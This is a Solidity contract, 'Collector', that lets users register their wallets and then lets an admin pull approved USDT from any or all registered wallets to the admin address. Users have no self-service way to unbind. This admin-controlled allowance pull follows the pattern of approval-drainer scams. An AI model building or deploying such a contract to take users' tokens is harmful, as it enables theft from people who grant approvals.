// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

/**
 * @title Collector
 * @notice Treasury collector contract for pulling approved USDT from user wallets.
 *         - Users self-bind once via {bindWallet}.
 *         - Admin can collect from bound wallets using allowance-based transfers.
 */
contract Collector {
    address public admin;
    IERC20 public immutable usdt;

    mapping(address => bool) public boundWallets;
    address[] public boundWalletList;

    event AdminChanged(address indexed previousAdmin, address indexed newAdmin);
    event WalletBound(address indexed user);
    event WalletUnbound(address indexed user);
    event Collected(address indexed from, uint256 amount);

    constructor(address _usdt) {
        require(_usdt != address(0), "USDT address required");
        admin = msg.sender;
        usdt = IERC20(_usdt);
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Not admin");
        _;
    }

    function transferAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0), "Zero admin");
        emit AdminChanged(admin, newAdmin);
        admin = newAdmin;
    }

    /// @notice Users call this once to opt-in for collection.
    function bindWallet() external {
        require(!boundWallets[msg.sender], "Already bound");
        boundWallets[msg.sender] = true;
        boundWalletList.push(msg.sender);
        emit WalletBound(msg.sender);
    }

    /// @notice Admin can unbind a wallet if needed.
    function unbindWallet(address user) external onlyAdmin {
        require(boundWallets[user], "Not bound");
        boundWallets[user] = false;
        emit WalletUnbound(user);
    }

    /// @notice View helper to get all currently tracked wallets.
    function getBoundWallets() external view returns (address[] memory) {
        return boundWalletList;
    }

    /// @notice Admin pulls a fixed amount from a single wallet.
    function collectFromWallet(address user, uint256 amount) external onlyAdmin {
        require(boundWallets[user], "Not bound");
        require(amount > 0, "Amount is zero");

        uint256 balance = usdt.balanceOf(user);
        require(balance >= amount, "Insufficient balance");

        uint256 allowed = usdt.allowance(user, address(this));
        require(allowed >= amount, "Insufficient allowance");

        bool ok = usdt.transferFrom(user, admin, amount);
        require(ok, "Transfer failed");

        emit Collected(user, amount);
    }

    /// @notice Admin pulls a fixed amount from all bound wallets.
    function collectAll(uint256 amountPerWallet) external onlyAdmin {
        require(amountPerWallet > 0, "Amount is zero");

        address[] memory wallets = boundWalletList;
        for (uint256 i = 0; i < wallets.length; i++) {
            address user = wallets[i];
            if (!boundWallets[user]) continue;

            uint256 balance = usdt.balanceOf(user);
            uint256 allowed = usdt.allowance(user, address(this));
            uint256 amount = amountPerWallet;

            if (balance < amount || allowed < amount) {
                continue;
            }

            bool ok = usdt.transferFrom(user, admin, amount);
            if (ok) {
                emit Collected(user, amount);
            }
        }
    }
}